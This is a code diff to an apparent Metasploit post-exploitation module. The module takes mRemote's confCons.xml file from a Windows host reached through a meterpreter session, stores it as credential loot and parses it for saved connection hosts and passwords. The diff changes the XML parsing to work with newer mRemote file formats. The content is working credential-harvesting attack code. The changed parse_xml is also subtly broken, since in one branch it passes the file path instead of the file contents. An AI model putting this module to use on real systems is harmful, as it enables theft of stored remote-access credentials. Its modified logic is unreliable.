@@ -24,7 +24,8 @@ class MetasploitModule < Msf::Post
           [
             'theLightCosine',
             'hdm', #Helped write the Decryption Routine
-            'mubix' #Helped write the Decryption Routine
+            'mubix', #Helped write the Decryption Routine
+            'jfitts' # fixup to xml parsing on later versions
           ],
       'Platform'      => [ 'win' ],
       'SessionTypes'  => [ 'meterpreter' ]
@@ -51,7 +52,7 @@ class MetasploitModule < Msf::Post
         condata = read_file(path)
         loot_path = store_loot('mremote.creds', 'text/xml', session, condata, path)
         vprint_good("confCons.xml saved to #{loot_path}")
-        parse_xml(condata)
+        parse_xml(loot_path)
         print_status("Finished processing #{path}")
       end
     rescue Rex::Post::Meterpreter::RequestError
@@ -62,7 +63,13 @@ class MetasploitModule < Msf::Post
 
   def parse_xml(data)
 
-    mxml= REXML::Document.new(data).root
+    a = File.readlines(data)
+    if a[1].include? "mrng:Connections"
+      a = a.drop(2).join
+    else
+      a = data
+    end
+    mxml = REXML::Document.new(a).root
     mxml.elements.to_a("//Node").each do |node|
 
       host = node.attributes['Hostname']
